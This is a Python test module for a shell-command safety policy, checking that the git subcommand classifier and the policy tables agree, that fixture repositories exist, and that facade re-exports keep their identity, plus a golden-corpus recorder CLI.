def test_git_pure_classification_agrees_with_the_policy_family() -> None:
    """The classifier's table verdict and the policy layer's git tables agree.

    For every pure git invocation whose subcommand is not dispatch-masked
    into the dangerous-command flow, the classifier hard-denies the
    subcommand as an unmodeled builtin or unrecognized word exactly when the
    policy layer does (requires_approval with a table denial reason, for the
    same table reason). Dispatch-masked subcommands (push, checkout, stash,
    reflog, ...) are out of scope: the mode-aware classifiers govern them
    before either table is consulted. Without the reader/unmodeled dedup
    (v0.5.9 P1-d) this fails: the classifier hard-denied describe,
    merge-base, name-rev, shortlog, whatchanged, verify-pack, and
    count-objects while the policy layer admitted them through its reader
    branch.
    """
    entries = load_corpus()
    assert entries, (
        "corpus.jsonl is missing or empty; regenerate with: "
        "uv run python tests/tools/test_shell_policy_corpus.py --record"
    )
    # The dedup's table invariant: the unmodeled table never contradicts the
    # policy layer's reader or recognized-nonreader branch for the same word.
    assert not _shell_git_support._GIT_UNMODELED_BUILTINS & (
        _shell_git_support._GIT_READER_SUBCOMMANDS
    )
    assert not _shell_git_support._GIT_UNMODELED_BUILTINS & (
        _shell_git_support._GIT_NONREADER_SUBCOMMANDS
    )
    policy_by_argv = {
        tuple(entry["argv"]): entry["expect"]["policy"]["value"]
        for entry in entries
        if entry["family"] == "policy" and "value" in entry["expect"]["policy"]
    }
    checked = 0
    for entry in entries:
        if entry["family"] != "git_pure":
            continue
        pure = entry["expect"]
        canonical = pure["canonical"]["value"]
        if not canonical or len(canonical) < 2:
            # Non-git rows are out of scope; dangling-global rows are the
            # deliberate runtime/classifier divergence the `divergence`
            # family pins.
            continue
        subcommand = canonical[1]
        if subcommand in _shell_git_classifier._DANGEROUS_GIT_SUBCOMMANDS:
            continue
        assert tuple(entry["argv"]) in policy_by_argv, entry["id"]
        policy_value = policy_by_argv[tuple(entry["argv"])]
        denial_reason = policy_value["denial_reason"]
        policy_denies = (
            policy_value["requires_approval"] is True
            and denial_reason is not None
            and denial_reason.startswith(_POLICY_TABLE_DENIAL_PREFIXES)
        )
        classification = pure["classification"]["value"]
        classifier_denies = classification["kind"] == "hard_denied"
        assert classifier_denies == policy_denies, (
            f"{entry['id']}: git {subcommand!r} classifies "
            f"{classification['kind']!r} but the policy layer "
            f"{'denies' if policy_denies else 'admits'} it"
        )
        if classifier_denies:
            assert denial_reason is not None and denial_reason.startswith(
                classification["reason"]
            ), entry["id"]
        checked += 1
    assert checked, "no agreement-checkable git_pure corpus rows found"


def test_corpus_fixture_tree_materializes(fixtures_root: Path) -> None:
    """The materialized fixture tree has the layout the corpus assumes."""
    assert (fixtures_root / "plain-repo" / ".git" / "config").is_file()
    assert (fixtures_root / "plain-repo" / "nested" / "inner.txt").is_file()
    assert (fixtures_root / "gitfile-repo" / ".git").is_file()
    assert (fixtures_root / "linked-worktree" / ".git").is_file()
    assert (fixtures_root / "bare-repo" / "HEAD").is_file()
    assert (fixtures_root / "bare-repo" / "objects").is_dir()
    assert (fixtures_root / "unreadable-config-repo" / ".git" / "config").is_dir()
    hook = fixtures_root / "hook-repo" / ".git" / "hooks" / "post-index-change"
    assert hook.stat().st_mode & 0o111, "executable hook lost its mode"
    bare_hook = fixtures_root / "bare-repo" / "hooks" / "post-index-change"
    assert bare_hook.stat().st_mode & 0o111, "executable bare hook lost its mode"
    plain_hook = fixtures_root / "plain-repo" / ".git" / "hooks" / "pre-push"
    assert not plain_hook.stat().st_mode & 0o111, "non-executable hook changed"


def test_facade_reexports_preserve_moved_identity() -> None:
    """The 3.2/3.3a/3.3b, 4.3, 4.4, and 4.5 splits: every facade name is the moved object itself."""
    moved = (
        "_COMBINED_SHORT_OPTION_MIN_LENGTH",
        "_OptionTable",
        "_ParsedOptions",
        "_SHORT_OPTION_LENGTH",
        "_argument_matches",
        "_command_name",
        "_has_long",
        "_has_short",
        "_has_short_in_cluster",
        "_is_combined_short_options",
        "_match_long",
        "_options_before_double_dash",
        "_scan_options",
        "matches_command_prefix",
    )
    for name in moved:
        assert getattr(policy, name) is getattr(_shell_argv, name), name
    grammar_moved = (
        "_INLINE_SWITCHES",
        "_MAX_EXECUTOR_DEPTH",
        "_PACKAGE_PATH_COMMANDS",
        "_PACKAGE_PATH_OPTIONS",
        "EXECUTOR_REGISTRY",
        "_executor_option",
        "_executor_package_policy",
        "_module_executor_command",
        "_package_local_path",
        "_package_module_tokens",
        "_package_requirement_path",
        "_short_interpreter_option",
        "ArgumentRange",
        "BoundaryKind",
        "executor_boundary",
        "executor_owned_tokens",
        "ExecutorBoundary",
        "ExecutorGrammar",
        "inline_interpreter_switch",
        "is_package_command",
        "package_argument_indexes",
    )
    for name in grammar_moved:
        assert getattr(policy, name) is getattr(_shell_executor_grammar, name), name

    # 4.3a-i: the classifier's tables, scanners, and per-subcommand verdicts.
    classifier_moved = (
        "_GIT_PUSH_TABLE",
        "_GIT_PUSH_BOOLEAN_SHORTS",
        "_GIT_PUSH_FORCE_OPTIONS",
        "_GIT_PUSH_HARD_GUARD_LONGS",
        "_PUSH_URL_SCHEME",
        "_push_destination_is_explicit",
        "_push_destination_fail_closed_reason",
        "_GIT_SWITCH_TABLE",
        "_GIT_SWITCH_BOOLEAN_SHORTS",
        "_GIT_SWITCH_DISCARD_OPTIONS",
        "_GIT_CHECKOUT_TABLE",
        "_GIT_RESTORE_TABLE",
        "_GIT_WORKTREE_TABLES",
        "_GIT_STASH_TABLE",
        "_GIT_REFLOG_TABLE",
        "_STASH_REFLOG_OPERATION_IDS",
        "_GIT_RESET_TABLE",
        "_GIT_RESET_BOOLEAN_SHORTS",
        "_GIT_CLEAN_TABLE",
        "_GIT_CLEAN_BOOLEAN_SHORTS",
        "_GIT_REMOTE_TABLE",
        "_GIT_REMOTE_BOOLEAN_SHORTS",
        "_GIT_REMOTE_MUTATION_SUBCOMMANDS",
        "_ROUTINE",
        "_hard_denied",
        "_grantable_classification",
        "_fail_closed_on_end_of_options",
        "_refspec_fail_closed_reason",
        "_push_operation_ids",
        "_classify_git_push",
        "_classify_git_worktree_subcommand",
        "_classify_git_switch",
        "_classify_git_stash_or_reflog",
        "_classify_git_hard_guard_subcommand",
        "_classify_git_remaining",
        # v0.5.9 P2-d: the symbolic-ref mode verdict.
        "_classify_git_symbolic_ref",
        # 4.3a-ii: the git config reason family and _classify_git_config.
        "_GIT_CONFIG_REMOTE_PUSH_EFFECTING_KEYS",
        "_GIT_CONFIG_BRANCH_PUSH_EFFECTING_KEYS",
        "_GIT_CONFIG_URL_PUSH_EFFECTING_KEYS",
        "_GIT_CONFIG_INCLUDE_SECTIONS",
        "_GIT_CONFIG_CORE_PROGRAM_KEYS",
        "_GIT_CONFIG_CORE_PROGRAM_SELECTION_KEYS",
        "_GIT_CONFIG_SEQUENCE_PROGRAM_SELECTION_KEYS",
        "_GIT_CONFIG_MAN_PROGRAM_SELECTION_KEYS",
        "_GIT_CONFIG_INTERACTIVE_PROGRAM_SELECTION_KEYS",
        "_GIT_CONFIG_FILTER_PROGRAM_SELECTION_KEYS",
        "_GIT_CONFIG_MERGE_PROGRAM_SELECTION_KEYS",
        "_GIT_CONFIG_DIFF_PROGRAM_SELECTION_KEYS",
        "_git_config_key_is_push_effecting",
        "_git_config_section_is_push_effecting",
        "_git_config_key_is_program_selection",
        "_git_config_section_is_program_selection",
        "_git_config_push_effecting_reason",
        "_git_config_program_selection_reason",
        "_git_config_program_section_reason",
        "_git_config_rename_guard_reason",
        "_git_config_section_operation_guard_reason",
        "_git_config_write_guard_reason",
        "_classify_git_config",
        # 4.3b: dispatch and dangerous-subcommand classification.
        "_classify_git_remote",
        "_dispatch_git_subcommand",
        "classify_dangerous_git_command",
        "_DANGEROUS_GIT_SUBCOMMANDS",
        "is_dangerous_git_subcommand",
    )
    for name in classifier_moved:
        assert getattr(policy, name) is getattr(_shell_git_classifier, name), name

    # 4.4: the inspection half (the family's only I/O module).
    inspection_moved = (
        "_FALSE_GIT_CONFIG_VALUES",
        "_GIT_CONFIG_ENTRY",
        "_GIT_CONFIG_SECTION_HEADER",
        "_GIT_TREE_WRITING_SUBCOMMANDS",
        "_INCLUDE_DIRECTIVE_NAMES",
        "_git_config_entries",
        "_git_config_paths",
        "_git_config_remote_url_names",
        "_git_dir_config_paths",
        "_git_index_hook_risk",
        "_git_value_is_active",
        "_parse_git_config_entries",
        "git_configured_remote_names",
        "git_cwd_relocations",
        "git_metadata_paths",
        "git_push_destination_risk",
        "git_work_tree_writing_subcommand",
        "resolve_git_work_tree",
        "resolve_repository_scope",
    )
    for name in inspection_moved:
        assert getattr(policy, name) is getattr(_shell_git_inspection, name), name

    # 4.5: the pure git-policy half (subcommand tables + _git_policy).
    git_policy_moved = (
        "_GIT_APPLY_TABLE",
        "_GIT_APPLY_UNSAFE_PATHS_REASON",
        "_GIT_ARCHIVE_OUTPUT_TABLE",
        "_GIT_INIT_TABLE",
        "_GIT_SUBCOMMAND_TABLE",
        "_GIT_SUBMODULE_ADD_TABLE",
        "_GIT_WORKTREE_ADD_TABLE",
        "_GIT_WORKTREE_MOVE_TABLE",
        "_git_archive_output_values",
        "_git_destination_operands",
        "_git_destructive_policy",
        "_git_policy",
        "_legacy_clean_flags",
        # v0.5.9 P2-d: the symbolic-ref mode policy.
        "_symbolic_ref_policy",
    )
    for name in git_policy_moved:
        assert getattr(policy, name) is getattr(_shell_git_policy, name), name
    assert policy._COMMAND_POLICIES["git"] is _shell_git_policy._git_policy

    # The registry is one dict: the facade re-export keeps its identity (a
    # mutation seam — test_shell_command_policy.py imports it from the facade).
    assert policy.EXECUTOR_REGISTRY is _shell_executor_grammar.EXECUTOR_REGISTRY
    assert len(policy.EXECUTOR_REGISTRY) == 38
    assert all(
        isinstance(grammar.options, _shell_argv._OptionTable)
        for grammar in policy.EXECUTOR_REGISTRY.values()
    )


# ---------------------------------------------------------------------------
# Recorder CLI
# ---------------------------------------------------------------------------


def main(argv: list[str] | None = None) -> int:
    """Record (--record) or check the corpus against the current module."""
    parser = argparse.ArgumentParser(
        description="Golden shell-policy corpus recorder/replayer."
    )
    parser.add_argument(
        "--record",
        action="store_true",
        help="regenerate corpus.jsonl against the current module",
    )
    args = parser.parse_args(argv)
    with tempfile.TemporaryDirectory(prefix="shell-policy-corpus-") as tmp:
        root = materialize_fixtures(FIXTURES_SOURCE, Path(tmp))
        build_recursive_rm_fixtures(root)
        build_bare_metadata_fixtures(root)
        build_curl_destination_fixtures(root)
        entries = build_entries(root)
    text = serialize_entries(entries)
    if args.record:
        CORPUS_PATH.write_text(text, encoding="utf-8")
        print(f"recorded {len(entries)} entries to {CORPUS_PATH}")
        return 0
    committed = CORPUS_PATH.read_text(encoding="utf-8") if CORPUS_PATH.is_file() else ""
    if committed == text:
        print(f"corpus round-trips: {len(entries)} entries byte-identical")
        return 0
    print(
        f"corpus is stale: {len(entries)} entries regenerate differently; "
        "run with --record"
    )
    return 1


if __name__ == "__main__":
    sys.exit(main())
